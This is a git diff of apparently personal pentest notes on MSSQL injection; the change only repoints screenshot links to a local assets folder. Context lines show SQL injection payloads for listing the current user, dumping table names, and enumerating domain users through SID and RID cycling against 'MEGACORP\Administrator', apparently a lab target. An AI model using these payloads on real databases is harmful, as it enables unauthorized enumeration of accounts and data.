@@ -14,7 +14,7 @@ user, system_user, current_user												"running as user"
 (SELECT STRING_AGG(name,',') FROM Hub_DB..sysobjects WHERE xtype = 'U')		"dump tables"
 ```
 
-![image-20200922131425094](/home/manish/.config/Typora/typora-user-images/image-20200922131425094.png)
+![image-20200922131425094](mssql.assets/image-20200922131425094.png)
 
 
 
@@ -28,7 +28,7 @@ user, system_user, current_user												"running as user"
 
 
 
-![image-20200922131859662](/home/manish/.config/Typora/typora-user-images/image-20200922131859662.png)
+![image-20200922131859662](mssql.assets/image-20200922131859662.png)
 
 
 
@@ -43,7 +43,7 @@ master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))
 - removing last 4 bytes will give us identifier we can increment rid to get new users
 - also note it is in little endian order
 
-![image-20200922132144302](/home/manish/.config/Typora/typora-user-images/image-20200922132144302.png)
+![image-20200922132144302](mssql.assets/image-20200922132144302.png)
 
 
 
@@ -51,7 +51,7 @@ master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))
 SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000) 	"finding username from sid"
 ```
 
-![image-20200922132708871](/home/manish/.config/Typora/typora-user-images/image-20200922132708871.png)
+![image-20200922132708871](mssql.assets/image-20200922132708871.png)
 
 
 
